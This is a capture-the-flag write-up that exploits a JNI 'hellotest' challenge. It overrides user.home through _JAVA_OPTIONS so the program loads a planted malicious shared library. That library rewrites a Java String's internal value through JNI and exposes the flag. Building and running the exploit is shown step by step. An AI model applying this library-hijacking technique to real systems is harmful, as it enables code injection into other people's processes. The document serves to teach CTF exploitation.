

### The weakness

``hellotest`` is written in C++, it invokes java function ``sayHello`` via JNI. The function is defined in ``Helloworld.java``, it invokes a native function ``print``.

```java
    ...
    public static void sayHello(String flag) throws Exception
    {
        String msg = "Hello World from JNI!";
        print(msg);
        if (msg.contains("flag"))
        {
            //What just happened? 
            print("What the flag? How did that happen...");
            print("Your flag is: " + flag);
        }
    }
    ...
    private static native void print(String msg);
    ...
```

``print`` is a C function, defined in ``hellolib.c``, which will be used to build shared object ``hellolib.so`` to be loaded into JVM at runtime.

```c
JNIEXPORT void JNICALL Java_Helloworld_print
  (JNIEnv* env, jclass cls, jstring msg)
{
    const char* str = (*env)->GetStringUTFChars(env, msg, 0);
    printf("%s\n", str);
    if (str)
        (*env)->ReleaseStringUTFChars(env, msg, str);
    fflush(stdout);
}
```

``HelloWorld`` copy ``hellolib.so`` from ``HelloWorld.jar``, here comes the vulnerability, it then copy ``hellolib.so`` to directory ``libFolder`` for later invoke. ``libFolder`` is a directoy, named *".helloWorld"*, under *System.getProperty("user.home")*. If we specify the property *"user.home"*, we can make it use library in arbitrary path.

```java
    private static void loadingLibrary() throws Exception
    {
        Path libFolder = Paths.get(System.getProperty("user.home"), ".helloWorld");
        
        //Create user folder to copy libraries from jar file.
        if (!Files.exists(libFolder))
            Files.createDirectory(libFolder);
        
        //Copy library from jar file into user folder
        Path libDest = libFolder.resolve("libhello.so");
        try
        {
        //Copy libhello if not already there.
            Files.copy(ClassLoader.getSystemResourceAsStream("libhello.so"), libDest);
        }
        catch (Exception e)
        { 
            //i don't know why this is throwing an error...
            //i think this fixes it...
        }
        
        //Dynamically link to it.
        System.load(libDest.toString());
    }
```

### Create something evil

We need to create a our evil ``hellolib.c``, lets' say ``fakelib.c``.  In the file we create a char array contains string *"flag"*.

```c
    jcharArray buf = (*env)->NewCharArray(env, 4);
    jchar arr[4] = {'f','l','a','g'};
    (*env)->SetCharArrayRegion(env, buf, 0, 4, arr); 
```

Assign the char array ``buf`` to ``msg``, *"\[C"* to indicate we are getting *value* field which is a char array as specified in [JNI Types and Data Structures](https://docs.oracle.com/javase/7/docs/technotes/guides/jni/spec/types.html#wp276)

```c
    jclass cla = (*env)->GetObjectClass(env, msg);
    jfieldID id = (*env)->GetFieldID(env, cla, "value", "[C");
    (*env)->SetObjectField(env, msg, id, buf);
```

We need a customized makefile to build the *.so* file, since we are only allowed to create files in */tmp*, we need to change the paths accordingly.

```make
libhello.so : fakelib.o
    cc fakelib.o -shared -o libhello.so
    mkdir -p .helloWorld
    cp libhello.so .helloWorld
	
fakelib.o : 
    cp /home/lib/Helloworld.h .
    cc  -c -I/usr/lib/jvm/java-8-openjdk-amd64/include -fpic fakelib.c
```

*_JAVA_OPTIONS* is way to specify JVM arguments as an environment variable instead of command line parameters. Run ``hellotest`` in ``/home/lib`` directory with *_JAVA_OPTIONS="-Duser.home=/tmp"*.

```bash
$ _JAVA_OPTIONS="-Duser.home=/tmp" /home/lib/hellotest
Picked up _JAVA_OPTIONS: -Duser.home=/tmp
fakelib                                                                                                                                                                 
Hello World from JNI!                   
fakelib                                 
What the flag? How did that happen...
fakelib
Your flag is: CTF{JN1_1s_r3a77y_f4n!}
```

### Reference

- [JNI Types and Data Structures](https://docs.oracle.com/javase/7/docs/technotes/guides/jni/spec/types.html#wp276)
- [Chapter 4: JNI Functions](https://docs.oracle.com/en/java/javase/13/docs/specs/jni/functions.html)
